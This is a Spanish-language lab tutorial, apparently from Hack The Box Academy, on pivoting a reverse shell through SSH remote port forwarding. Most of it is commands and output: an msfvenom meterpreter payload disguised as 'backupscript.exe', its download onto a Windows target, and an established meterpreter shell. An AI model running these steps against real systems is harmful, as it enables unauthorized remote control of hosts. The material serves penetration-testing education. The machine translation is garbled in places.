# Remote/Reverse Port Forwarding with SSH

Hemos visto el reenvío de puertos locales, donde SSH puede escuchar en nuestro host local y reenviar un servicio en el host remoto a nuestro puerto, y el reenvío dinámico de puertos, donde podemos enviar paquetes a una red remota a través de un host de pivote. Pero a veces, es posible que deseemos reenviar un servicio local al puerto remoto también. Consideremos el escenario en el que podemos RDP en el host de Windows`Windows A`. Como se puede ver en la imagen a continuación, en nuestro caso anterior, podríamos pivotar en el host de Windows a través del servidor Ubuntu.

![](https://academy.hackthebox.com/storage/modules/158/33.png)

`But what happens if we try to gain a reverse shell?`

El`outgoing connection`para el host de Windows solo se limita al`172.16.5.0/23`red. Esto se debe a que el host de Windows no tiene ninguna conexión directa con la red en la que está el host de ataque. Si iniciamos un oyente de MetaSploit en nuestro host de ataque e intentamos obtener un shell inverso, no podremos obtener una conexión directa aquí porque el servidor de Windows no sabe cómo enrutar el tráfico de dejar su red (172.16.5.0/23) para llegar al 10.129.xx (la red de laboratorio de la academia).

Hay varias veces durante un compromiso de prueba de penetración cuando no es factible tener una conexión de escritorio remota. Es posible que quieras`upload`/`download`archivos (cuando el portapapeles RDP está deshabilitado),`use exploits`o`low-level Windows API`Uso de una sesión de meterpreter para realizar enumeración en el host de Windows, que no es posible usar el incorporado[Ejecutables de Windows](https://lolbas-project.github.io/).

En estos casos, tendríamos que encontrar un host de pivote, que es un punto de conexión común entre nuestro host de ataque y el servidor de Windows. En nuestro caso, nuestro host Pivot sería el servidor Ubuntu, ya que puede conectarse a ambos:`our attack host`y`the Windows target`. Para ganar un`Meterpreter shell`En Windows, crearemos una carga útil de meterpreter HTTPS utilizando`msfvenom`, pero la configuración de la conexión inversa para la carga útil sería la dirección IP del host del servidor Ubuntu (`172.16.5.129`). Usaremos el puerto 8080 en el servidor Ubuntu para reenviar todos nuestros paquetes inversos al puerto 8000 de los hosts de ataque, donde se está ejecutando nuestro oyente de MetaSploit.

### **Creación de una carga útil de Windows con MSFVENOM**

Reenvío de puertos remoto/inverso con SSH

```
xnoxos@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe

```

### **Configurar y iniciar el Multi/Handler**

Reenvío de puertos remoto/inverso con SSH

```
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on https://0.0.0.0:8000

```

Una vez que se crea nuestra carga útil y tenemos a nuestro oyente configurado y ejecutado, podemos copiar la carga útil al servidor Ubuntu utilizando el`scp`Comando ya que ya tenemos las credenciales para conectarnos al servidor Ubuntu usando SSH.

### **Transferir la carga útil al host Pivot**

Reenvío de puertos remoto/inverso con SSH

```
xnoxos@htb[/htb]$ scp backupscript.exe ubuntu@<ipAddressofTarget>:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00

```

Después de copiar la carga útil, comenzaremos un`python3 HTTP server`Usando el siguiente comando en el servidor Ubuntu en el mismo directorio donde copiamos nuestra carga útil.

### **Iniciar servidor web de Python3 en Pivot Host**

Reenvío de puertos remoto/inverso con SSH

```
ubuntu@Webserver$ python3 -m http.server 8123
```

### **Descargar la carga útil en el objetivo de Windows**

Podemos descargar esto`backupscript.exe`En el host de Windows a través de un navegador web o el cmdlet de PowerShell`Invoke-WebRequest`.

Reenvío de puertos remoto/inverso con SSH

```powershell
PS C:\Windows\system32> Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"

```

Una vez que tengamos nuestra carga útil descargada en el host de Windows, usaremos`SSH remote port forwarding`Para reenviar conexiones desde el puerto 8080 del servidor de Ubuntu a nuestro servicio de oyente de MSFConsole en el puerto 8000. Usaremos`-vN`Argumento en nuestro comando ssh para hacerlo textual y pídale que no solicite el shell de inicio de sesión. El`-R`El comando le pide al servidor Ubuntu que escuche`<targetIPaddress>:8080`y reenviar todas las conexiones entrantes en el puerto`8080`a nuestro oyente msfconsole en`0.0.0.0:8000`de nuestro`attack host`.

### **Usando ssh -r**

Reenvío de puertos remoto/inverso con SSH

```
xnoxos@htb[/htb]$ ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 ubuntu@<ipAddressofTarget> -vN

```

Después de crear el puerto remoto SSH hacia adelante, podemos ejecutar la carga útil desde el objetivo de Windows. Si la carga útil se ejecuta según lo previsto e intenta conectarse de nuevo a nuestro oyente, podemos ver los registros del pivote en el host Pivot.

### **Ver los registros desde el pivote**

Reenvío de puertos remoto/inverso con SSH

```
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000

```

Si todo está configurado correctamente, recibiremos un shell meterpreter pivotado a través del servidor Ubuntu.

### **Sesión de meterpreter establecida**

Reenvío de puertos remoto/inverso con SSH

```
[*] Started HTTPS reverse handler on https://0.0.0.0:8000
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] https://0.0.0.0:8000 handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>

```

Nuestra sesión de meterpreter debe enumerar que nuestra conexión entrante es de un host local en sí (`127.0.0.1`) ya que estamos recibiendo la conexión sobre el`local SSH socket`, que creó un`outbound`conexión al servidor Ubuntu. Emitiendo el`netstat`El comando puede mostrarnos que la conexión entrante es del servicio SSH.

La siguiente representación gráfica proporciona una forma alternativa de comprender esta técnica.

![](https://academy.hackthebox.com/storage/modules/158/44.png)

Además de responder las preguntas de desafío, practique esta técnica e intente obtener un shell inverso del objetivo de Windows.